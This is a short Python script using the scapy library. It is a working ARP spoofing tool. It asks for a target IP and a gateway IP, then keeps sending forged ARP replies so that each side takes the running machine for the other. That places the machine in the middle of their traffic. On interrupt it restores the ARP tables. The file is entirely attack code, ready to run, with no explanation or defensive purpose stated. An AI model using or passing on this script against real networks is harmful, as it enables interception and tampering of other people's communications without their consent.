import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    try:
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        print("[-] Failed to get MAC address for " + ip)
        return None
        
    

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) 
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)




target_ip = input("Enter the Target IP: ")
Router_ip = input("Enter the Gateway/ Router IP: ")
try:
    sent_packets_count= 0   
    while True:
        
        spoof(Router_ip, target_ip) #Saying router that im the target
        spoof(target_ip, Router_ip) #Saying target that im the router
        sent_packets_count=sent_packets_count + 2
        print("[+] Packets sent: " + str(sent_packets_count),end="\r")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detecting CTRL + C .....Quitting.\n")
    print("[+] Restoring ARP tables......Please Wait.....")
    restore(target_ip, Router_ip)
    restore(Router_ip, target_ip)



